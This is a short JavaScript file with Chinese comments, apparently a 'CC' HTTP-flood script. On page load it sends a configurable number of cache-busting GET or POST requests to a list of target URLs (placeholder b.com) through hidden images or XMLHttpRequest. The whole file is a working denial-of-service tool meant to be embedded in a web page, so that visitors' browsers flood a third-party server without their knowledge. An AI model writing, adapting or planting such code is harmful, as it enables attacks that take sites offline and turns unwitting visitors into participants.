window.addEventListener('load', function () {

	/***********************
	 * 请求参数设置
	 ***********************/ 
	var ccData = {

		// 发送请求的目标URL数组
		url: [
			'http://b.com:8081/index.php?xxx=99999',
			'http://b.com:8081/index.php?xxx=99999'
		],

		// 请求方法，可以是 GET 或 POST
		// 当请求方法是 GET 时使用加载图片的方式发送请求
		// 当请求方法是 POST 时使用 ajax 方式发送请求
		method: 'POST',

		// 当请求方法是 POST 时所使用的提交数据
		data: 'here is post data while request method is post',

		// 每个 URL 发起请求的次数
		count: 10
	}


	// 执行请求
	for (var i = 0; i < ccData.url.length; i++) {
		var urlObj = new URL(ccData.url[i]);
		for (var j = 0; j < ccData.count; j++) {
			var url = urlObj.origin + urlObj.pathname + '?cc=' + btoa(Math.random()).replace(/[=\+]/g, '');
			urlObj.searchParams.forEach(function (v, k) {
				url += '&' + k + '=' + v;
			})
			if (ccData.method == "POST") {
				var httpRequest = new XMLHttpRequest();
				httpRequest.open('POST', url);
				httpRequest.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
				httpRequest.send(ccData.data);
			} else {
				var img = document.createElement("img");
				img.src = url;
				img.style.display = 'none';
				document.body.append(img);
			}
		}
	}
});
